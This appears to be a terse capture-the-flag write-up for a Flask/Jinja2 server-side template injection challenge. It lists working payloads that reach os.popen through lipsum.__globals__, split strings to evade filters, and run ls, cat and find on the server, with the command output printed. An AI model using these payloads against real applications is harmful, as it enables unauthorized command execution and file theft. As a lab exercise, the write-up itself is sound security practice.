1. `{{7 * 7}}`
2. SSTI works so we just proceed to ls by
* **`ls -a`:**
    ```jinja2
    {{ lipsum.__globals__['o'+'s'].popen('l'+'s -a').read() }}
    ```
3. found `flag.txt` so we just did
* **`cat`:**
    ```jinja2
    {{lipsum.__globals__['o'+'s'].popen('ca'+'t /fl'+'ag.txt').read()}}
    ```
4. its empty tho. we look for other files by doing:
* **`ls -R`:**
    ```jinja2
    {{ lipsum.__globals__['o'+'s'].popen('l'+'s -R').read() }}
    ```
* and found these:
* **_**
    ```
    > .: Dockerfile app.py docker-compose.yml flag.txt requirements.txt static templates ./static: script.js style.css ./templates: echo.html index.html
    ```
5. find a files hidden in /var/www/ or /root/
* **`find`:**
    ```jinja2
    {{lipsum.__globals__['o'+'s'].popen('fi'+'nd / -name "fl*" 2>/dev/null').read()}}
    ```
* **found these**
    ```
    /proc/sys/net/ipv4/route/flush
    /proc/sys/net/ipv6/flowlabel_consistency
    /proc/sys/net/ipv6/flowlabel_reflect
    /proc/sys/net/ipv6/flowlabel_state_ranges
    /proc/sys/net/ipv6/route/flush
    /sys/devices/pnp0/00:00/00:00:0/00:00:0.0/tty/ttyS0/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.16/tty/ttyS16/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.24/tty/ttyS24/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.14/tty/ttyS14/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.22/tty/ttyS22/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.12/tty/ttyS12/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.30/tty/ttyS30/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.20/tty/ttyS20/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.8/tty/ttyS8/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.10/tty/ttyS10/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.29/tty/ttyS29/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.19/tty/ttyS19/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.6/tty/ttyS6/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.27/tty/ttyS27/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.17/tty/ttyS17/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.4/tty/ttyS4/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.25/tty/ttyS25/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.15/tty/ttyS15/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.23/tty/ttyS23/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.13/tty/ttyS13/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.31/tty/ttyS31/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.21/tty/ttyS21/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.9/tty/ttyS9/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.11/tty/ttyS11/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.7/tty/ttyS7/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.28/tty/ttyS28/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.18/tty/ttyS18/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.5/tty/ttyS5/flags
    /sys/devices/platform/serial8250/serial8250:0/serial8250:0.26/tty/ttyS26/flags
    /sys/devices/virtual/net/eth0/flags
    /sys/devices/virtual/net/lo/flags
    /sys/module/kvm/parameters/flush_on_reuse
    /sys/module/kvm_intel/parameters/flexpriority
    /usr/share/bash-completion/completions/flock
    /usr/local/lib/python3.12/site-packages/flask-3.1.3.dist-info
    /usr/local/lib/python3.12/site-packages/flask
    /usr/local/bin/flask
    /usr/local/include/python3.12/cpython/floatobject.h
    /usr/local/include/python3.12/floatobject.h
    /usr/bin/flock
    /app/flag.txt
    ```
6. found `/app/flag.txt` so we just did
* **`cat`:**
    ```jinja2
    {{lipsum.__globals__['o'+'s'].popen('ca'+'t /app/fl'+'ag.txt').read()}}
    ```